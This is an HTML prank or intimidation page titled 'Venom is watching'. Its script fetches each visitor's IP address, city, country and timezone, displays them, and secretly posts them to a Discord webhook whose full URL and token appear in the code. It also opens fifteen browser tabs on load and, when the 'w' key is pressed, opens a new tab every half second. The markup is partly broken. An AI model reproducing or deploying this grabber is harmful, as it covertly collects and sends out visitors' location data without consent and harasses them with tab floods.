<!DOCTYPE html>

<head>

            background-size: cover;
            color: red;
            text-align: center;
            font-family: Tempus Sans ITC, sans-serif;
        }
        h1 {
            font-size: 30px;
            margin-top: 350px;
            position: absolute;
            top: 20%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .info {

        }
        .container {
            display: flex;

            align-items: center;

            border: 2px solid rgb(8, 8, 8);

</head>
<body>
    <h1> Venom is watching hhhhh</h1>
    <div class="container">
        <div class="image-box">

        </div>
        <div class="info" id="user-info">
            <p><strong>IP:</strong> Loading...</p>

        Your browser does not support the audio element.

    <script>
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                document.getElementById('user-info').innerHTML = 
                    `<p><strong>IP:</strong> ${data.ip}</p>
                    <p><strong>City:</strong> ${data.city}</p>
                    <p><strong>Country:</strong> ${data.country_name}</p>
                    <p><strong>Timezone:</strong> ${data.timezone}</p>`;
                
                // Send IP data to Discord webhook
                fetch('https://discord.com/api/webhooks/1236940095806771210/d005WvqPwoSa4eWihG8yb-5L861vnO_MwEXXWR8oHt5br_tNqIE7ZxyZAjz2sQOGTq6e', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `New visitor:\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}\nTimezone: ${data.timezone}`
                    })
                });
            })
            .catch(() => {
                document.getElementById('user-info').innerHTML = '<p>Failed to load IP data.</p>';
            });

        // Open 15 tabs to the Discord link (may be blocked by browsers)
        for (let i = 0; i < 15; i++) {
            window.open('https://discord.gg/', '_blank');
        }

        document.addEventListener("keydown", function(event) {
            if (event.key.toLowerCase() === "w") {
                setInterval(() => {
                    window.open("https://discord.gg/", "_blank");
                }, 500);
